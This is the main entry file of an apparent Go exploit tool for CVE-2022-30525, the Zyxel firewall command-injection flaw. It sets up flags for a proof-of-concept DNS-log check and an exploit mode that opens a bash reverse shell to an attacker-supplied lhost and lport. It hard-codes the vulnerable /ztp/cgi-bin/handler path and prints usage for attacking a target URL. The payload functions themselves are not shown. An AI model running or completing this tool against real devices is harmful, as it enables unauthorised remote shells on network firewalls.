package main

//author:160team.west9B
import (
	"flag"
	"fmt"
)

var (
	method    string
	url       string
	lhost     string
	lport     string
	dnsLogAdr string
	path      = "/ztp/cgi-bin/handler"
)

func init() {
	flag.StringVar(&method,
		"m",
		"",
		"method:poc/exp",
	)
	flag.StringVar(&url,
		"u",
		"",
		"url:https://127.0.0.1/",
	)
	flag.StringVar(&lhost,
		"lhost",
		"ip",
		"lhost:bash-shell ip",
	)
	flag.StringVar(&lport,
		"lport",
		"port",
		"lport:bash-shell port",
	)

}
func main() {
	flag.Parse()
	fmt.Println("CVE-2022-30525 Zyxel防火墙命令注入漏洞 POC&EXP")
	fmt.Println("author:160team.west9b")
	if method == "poc" {
		PocDnsLog()
		return
	}
	if method == "exp" && lhost != "ip" && lport != "port" {
		ExpBashShell()
		return
	}
	fmt.Println("usage_poc:cve-2022-30525.exe -m poc -u url")
	fmt.Println("usage_exp:cve-2022-30525.exe -m exp -u url -lhost ip -lport port")
}
